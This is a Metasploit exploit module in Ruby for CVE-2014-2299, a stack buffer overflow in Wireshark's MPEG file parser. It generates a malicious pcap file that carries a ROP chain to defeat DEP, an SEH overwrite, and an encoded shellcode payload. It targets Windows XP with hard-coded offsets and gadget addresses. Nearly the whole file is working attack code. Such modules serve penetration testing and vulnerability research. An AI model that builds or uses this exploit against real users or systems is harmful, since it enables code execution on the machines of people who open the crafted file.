#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark <= 1.8.12/1.10.5 wiretap/mpeg.c Stack Buffer Overflow',
      'Description'    => %q{
          This module triggers a stack buffer overflow in Wireshark <= 1.8.12/1.10.5
          by generating an malicious file.)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
    'Wesley Neelen', # Discovery vulnerability
          'j0sm1',  # Exploit and msf module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-2299'],
          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=9843' ],
          [ 'URL', 'http://www.wireshark.org/security/wnpa-sec-2014-04.html' ],
          [ 'URL', 'http://www.securityfocus.com/bid/66066/info' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'BadChars'    => "\xff",
          'Space'       => 600,
          'DisableNops' => 'True',
          'PrependEncoder' => "\x81\xec\xc8\x00\x00\x00" # sub esp,200 
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'WinXP SP3 Spanish (bypass DEP)',
            {
              'OffSet' => 69732,
              'OffSet2' => 70476,
              'Ret'    => 0x1c077cc3, # pop/pop/ret -> "c:\Program Files\Wireshark\krb5_32.dll" (version: 1.6.3.16) 
              'jmpesp' => 0x68e2bfb9,
            }
          ],
    [ 'WinXP SP2/SP3 English  (bypass DEP)',
            {
              'OffSet2' => 70692,
              'OffSet' => 70476,
              'Ret'    => 0x1c077cc3, # pop/pop/ret -> krb5_32.dll module
              'jmpesp' => 0x68e2bfb9,
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar 20 2014'
    ))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'pcap file',  'mpeg_overflow.pcap']),
      ], self.class)
  end

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x61863c2a,  # POP EAX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x62d9027c,  # ptr to &VirtualProtect() [IAT libcares-2.dll]
      0x61970969,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
      0x61988cf6,  # XCHG EAX,ESI # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
      0x619c0a2a,  # POP EBP # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x61841e98,  # & push esp # ret  [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x6191d11a,  # POP EBX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x00000201,  # 0x00000201-> ebx
      0x5a4c1414,  # POP EDX # RETN [zlib1.dll, ver: 1.2.5.0] 
      0x00000040,  # 0x00000040-> edx
      0x6197660f,  # POP ECX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x668242b9,  # &Writable location [libgnutls-26.dll]
      0x6199b8a5,  # POP EDI # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0
      0x63a528c2,  # RETN (ROP NOP) [libgobject-2.0-0.dll]
      0x61863c2a,  # POP EAX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
      0x90909090,  # nop
      0x6199652d,  # PUSHAD # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
    ].flatten.pack("V*")

    return rop_gadgets

  end

  def exploit

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    ropchain = create_rop_chain
    magic_header = "\xff\xfb\x41"                # mpeg magic_number(MP3) -> http://en.wikipedia.org/wiki/MP3#File_structure
    # Here we build the packet data
    packet = rand_text_alpha(883)
    packet << "\x6c\x7d\x37\x6c" # NOP RETN
    packet << "\x6c\x7d\x37\x6c" # NOP RETN
    packet << ropchain
    packet << payload.encoded                    # Shellcode
    packet << rand_text_alpha(target['OffSet'] - 892 - ropchain.length - payload.encoded.length)

    # 0xff is a badchar for this exploit then we can't make a jump back with jmp $-2000
    # After nseh and seh we haven't space, then we have to jump to another location.

    # When file is open with command line. This is NSEH/SEH overwrite
    packet << make_nops(4) # nseh
    packet << "\x6c\x2e\xe0\x68" # ADD ESP,93C # MOV EAX,EBX # POP EBX # POP ESI # POP EDI # POP EBP # RETN

    packet << rand_text_alpha(target['OffSet2'] - target['OffSet'] - 8) # junk

    # When file is open with GUI interface. This is NSEH/SEH overwrite
    packet << make_nops(4) # nseh
    # seh -> # ADD ESP,86C # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libjpeg-8.dll] **
    packet << "\x55\x59\x80\x6b"

    print_status("Preparing payload")
    filecontent = magic_header
    filecontent << packet
    print_status("Writing payload to file, " + filecontent.length.to_s()+" bytes")
    file_create(filecontent)

  end
end
